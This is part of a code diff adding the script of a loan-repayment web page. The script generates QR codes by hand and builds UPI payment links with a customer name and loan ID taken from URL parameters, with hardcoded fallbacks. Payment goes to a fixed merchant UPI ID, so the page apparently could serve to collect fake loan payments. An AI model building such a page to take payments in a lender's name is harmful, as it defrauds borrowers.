+      }
+
+      const maxDataBits = totalDataCw * 8;
+      const terminatorLen = Math.min(4, maxDataBits - bits.length);
+      if (terminatorLen > 0) pushBits(0, terminatorLen);
+      while (bits.length % 8 !== 0) bits.push(0);
+
+      const dataCodewords = new Uint8Array(totalDataCw);
+      let cwIdx = 0;
+      for (let i = 0; i < bits.length && cwIdx < totalDataCw; i += 8) {
+        let byteVal = 0;
+        for (let b = 0; b < 8; b++) {
+          byteVal = (byteVal << 1) | (bits[i + b] || 0);
+        }
+        dataCodewords[cwIdx++] = byteVal;
+      }
+
+      const padBytes = [0xec, 0x11];
+      let padIdx = 0;
+      while (cwIdx < totalDataCw) {
+        dataCodewords[cwIdx++] = padBytes[padIdx % 2];
+        padIdx++;
+      }
+
+      const shortBlockLen = Math.floor(totalDataCw / numBlocks);
+      const longBlocksCount = totalDataCw % numBlocks;
+      const dataBlocks = [];
+      const ecBlocks = [];
+      let offset = 0;
+
+      for (let b = 0; b < numBlocks; b++) {
+        const len = shortBlockLen + (b >= numBlocks - longBlocksCount ? 1 : 0);
+        const block = dataCodewords.slice(offset, offset + len);
+        offset += len;
+        dataBlocks.push(block);
+        ecBlocks.push(qrCalcEc(block, ecCwPerBlock));
+      }
+
+      const interleaved = [];
+      const maxBlockLen = shortBlockLen + (longBlocksCount > 0 ? 1 : 0);
+      for (let i = 0; i < maxBlockLen; i++) {
+        for (let b = 0; b < numBlocks; b++) {
+          if (i < dataBlocks[b].length) interleaved.push(dataBlocks[b][i]);
+        }
+      }
+      for (let i = 0; i < ecCwPerBlock; i++) {
+        for (let b = 0; b < numBlocks; b++) {
+          interleaved.push(ecBlocks[b][i]);
+        }
+      }
+
+      const finalBits = [];
+      for (const cw of interleaved) {
+        for (let bit = 7; bit >= 0; bit--) {
+          finalBits.push((cw >> bit) & 1);
+        }
+      }
+
+      const matrix = Array.from({ length: size }, () => new Int8Array(size).fill(-1));
+      const reserved = Array.from({ length: size }, () => new Uint8Array(size).fill(0));
+
+      const setModule = (r, c, val, isReserved = true) => {
+        if (r >= 0 && r < size && c >= 0 && c < size) {
+          matrix[r][c] = val ? 1 : 0;
+          if (isReserved) reserved[r][c] = 1;
+        }
+      };
+
+      const drawFinder = (topR, leftC) => {
+        for (let r = -1; r <= 7; r++) {
+          for (let c = -1; c <= 7; c++) {
+            const rr = topR + r;
+            const cc = leftC + c;
+            if (rr < 0 || rr >= size || cc < 0 || cc >= size) continue;
+            const inBorder = r === 0 || r === 6 || c === 0 || c === 6;
+            const inCenter = r >= 2 && r <= 4 && c >= 2 && c <= 4;
+            const isDark = r >= 0 && r <= 6 && c >= 0 && c <= 6 && (inBorder || inCenter);
+            setModule(rr, cc, isDark ? 1 : 0, true);
+          }
+        }
+      };
+
+      drawFinder(0, 0);
+      drawFinder(0, size - 7);
+      drawFinder(size - 7, 0);
+
+      const alignCentersByVer = {
+        2: [6, 18],
+        3: [6, 22],
+        4: [6, 26],
+        5: [6, 30],
+        6: [6, 34],
+        7: [6, 22, 38],
+        8: [6, 24, 42],
+        9: [6, 26, 46],
+        10: [6, 28, 50]
+      };
+      const centers = alignCentersByVer[ver] || [];
+      for (const rCenter of centers) {
+        for (const cCenter of centers) {
+          if (reserved[rCenter][cCenter]) continue;
+          for (let dr = -2; dr <= 2; dr++) {
+            for (let dc = -2; dc <= 2; dc++) {
+              const dark = Math.abs(dr) === 2 || Math.abs(dc) === 2 || (dr === 0 && dc === 0);
+              setModule(rCenter + dr, cCenter + dc, dark ? 1 : 0, true);
+            }
+          }
+        }
+      }
+
+      for (let i = 8; i < size - 8; i++) {
+        const bitVal = i % 2 === 0 ? 1 : 0;
+        if (!reserved[6][i]) setModule(6, i, bitVal, true);
+        if (!reserved[i][6]) setModule(i, 6, bitVal, true);
+      }
+
+      setModule(size - 8, 8, 1, true);
+
+      for (let i = 0; i < 8; i++) {
+        if (i < size) {
+          reserved[8][i] = 1;
+          reserved[i][8] = 1;
+        }
+        if (size - 1 - i >= 0) {
+          reserved[8][size - 1 - i] = 1;
+          reserved[size - 1 - i][8] = 1;
+        }
+      }
+
+      let bitIdx = 0;
+      let upward = true;
+      for (let col = size - 1; col > 0; col -= 2) {
+        if (col === 6) col = 5;
+        for (let step = 0; step < size; step++) {
+          const r = upward ? size - 1 - step : step;
+          for (const c of [col, col - 1]) {
+            if (!reserved[r][c]) {
+              const val = bitIdx < finalBits.length ? finalBits[bitIdx++] : 0;
+              matrix[r][c] = val;
+            }
+          }
+        }
+        upward = !upward;
+      }
+
+      for (let r = 0; r < size; r++) {
+        for (let c = 0; c < size; c++) {
+          if (!reserved[r][c] && (r + c) % 2 === 0) {
+            matrix[r][c] ^= 1;
+          }
+        }
+      }
+
+      const formatBits = 0x5412;
+      const getFmtBit = (idx) => (formatBits >> (14 - idx)) & 1;
+
+      const darkCoordsA = [
+        [8, 0], [8, 1], [8, 2], [8, 3], [8, 4], [8, 5], [8, 7], [8, 8],
+        [7, 8], [5, 8], [4, 8], [3, 8], [2, 8], [1, 8], [0, 8]
+      ];
+      darkCoordsA.forEach(([r, c], idx) => {
+        matrix[r][c] = getFmtBit(idx);
+      });
+
+      const darkCoordsB = [
+        [size - 1, 8], [size - 2, 8], [size - 3, 8], [size - 4, 8],
+        [size - 5, 8], [size - 6, 8], [size - 7, 8],
+        [8, size - 8], [8, size - 7], [8, size - 6], [8, size - 5],
+        [8, size - 4], [8, size - 3], [8, size - 2], [8, size - 1]
+      ];
+      darkCoordsB.forEach(([r, c], idx) => {
+        matrix[r][c] = getFmtBit(idx);
+      });
+
+      const quietZone = 2;
+      const totalModules = size + quietZone * 2;
+      let rects = '';
+      for (let r = 0; r < size; r++) {
+        for (let c = 0; c < size; c++) {
+          if (matrix[r][c] === 1) {
+            rects += '<rect x="' + (c + quietZone) + '" y="' + (r + quietZone) + '" width="1" height="1"/>';
+          }
+        }
+      }
+
+      return (
+        '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 ' +
+        totalModules +
+        ' ' +
+        totalModules +
+        '" shape-rendering="crispEdges">' +
+        '<rect width="' +
+        totalModules +
+        '" height="' +
+        totalModules +
+        '" fill="#FFFFFF"/>' +
+        '<g fill="#0F172A">' +
+        rects +
+        '</g></svg>'
+      );
+    }
+
+    function renderPcQrCode(upiUri) {
+      const container = document.getElementById('qrCodeContainer');
+      if (!container) return;
+      try {
+        container.innerHTML = generateQrCodeSvg(upiUri);
+      } catch (err) {
+        container.innerHTML =
+          '<img src="https://placehold.co/190x190/ffffff/0f172a?text=UPI+QR" alt="QR Code" style="width:100%;height:100%;object-fit:contain;" />';
+      }
+    }
+
+    function openPaymentModal() {
+      const amount = syncBillAmountDisplay(document.getElementById('bill-amount').textContent);
+      const loanId = document.getElementById('loan-id').textContent.trim();
+      const customerName = document.getElementById('holder-name').textContent.trim();
+      const upiUri = buildUpiIntentUri(amount);
+
+      const mobileBox = document.getElementById('mobilePaymentBox');
+      const pcBox = document.getElementById('pcQrModalBox');
+      const overlay = document.getElementById('paymentModal');
+
+      if (isMobileDevice()) {
+        if (overlay) overlay.classList.remove('active');
+        if (pcBox) pcBox.style.display = 'none';
+        if (mobileBox) mobileBox.style.display = 'none';
+
+        try {
+          window.location.href = upiUri;
+        } catch (err) {
+          // Ignore if blocked by browser
+        }
+        return;
+      }
+
+      if (mobileBox) mobileBox.style.display = 'none';
+      if (pcBox) pcBox.style.display = 'block';
+
+      document.getElementById('qrCustomerName').textContent = (customerName || 'ROHIT KUMAR').toUpperCase();
+      document.getElementById('qrLoanId').textContent = 'LOAN ID: ' + (loanId || 'DMI0049457607').toUpperCase();
+      document.getElementById('qrAmountDisplay').textContent = amount;
+
+      renderPcQrCode(upiUri);
+      if (overlay) overlay.classList.add('active');
+    }
+
+    function copyUpiLink(uriText) {
+      try {
+        const tempInput = document.createElement('textarea');
+        tempInput.value = uriText;
+        document.body.appendChild(tempInput);
+        tempInput.select();
+        document.execCommand('copy');
+        document.body.removeChild(tempInput);
+        const copyBtn = document.getElementById('copyUpiBtn');
+        if (copyBtn) {
+          copyBtn.textContent = 'UPI Link Copied!';
+        }
+      } catch (e) {
+        // Ignore clipboard errors if blocked
+      }
+    }
+
+    function confirmPayment() {
+      const amount = syncBillAmountDisplay(document.getElementById('bill-amount').textContent);
+      const upiUri = buildUpiIntentUri(amount);
+
+      document.getElementById('modalTitle').textContent = 'UPI Payment Ready';
+      document.getElementById('modalDesc').innerHTML =
+        'Payee: <strong>' + MERCHANT_PAYEE_NAME + '</strong><br>UPI ID: <strong>' + MERCHANT_UPI_ID + '</strong>';
+      document.getElementById('modalAmount').textContent = amount;
+      document.getElementById('modalActions').innerHTML =
+        '<div style="width:100%;">' +
+          '<div class="upi-uri-box" id="upiUriDisplay">' + upiUri + '</div>' +
+          '<a href="' + upiUri + '" class="upi-launch-link">Open UPI App</a>' +
+          '<button type="button" id="copyUpiBtn" class="upi-copy-btn" onclick="copyUpiLink(\'' + upiUri.replace(/'/g, "\\'") + '\')">Copy UPI Link</button>' +
+          '<button type="button" class="modal-btn modal-btn-cancel" style="width:100%; margin-top:8px;" onclick="closePaymentModal()">Close</button>' +
+        '</div>';
+
+      try {
+        window.location.href = upiUri;
+      } catch (err) {
+        // Fallback link and copy button remain available in the modal
+      }
+    }
+
+    function closePaymentModal(event) {
+      if (!event || event.target === document.getElementById('paymentModal')) {
+        document.getElementById('paymentModal').classList.remove('active');
+      }
+    }
+
+    window.addEventListener('DOMContentLoaded', () => {
+      applyReceiptIcons();
+      applyUrlParameters();
+    });
+  </script>
+
+</body>
+</html>
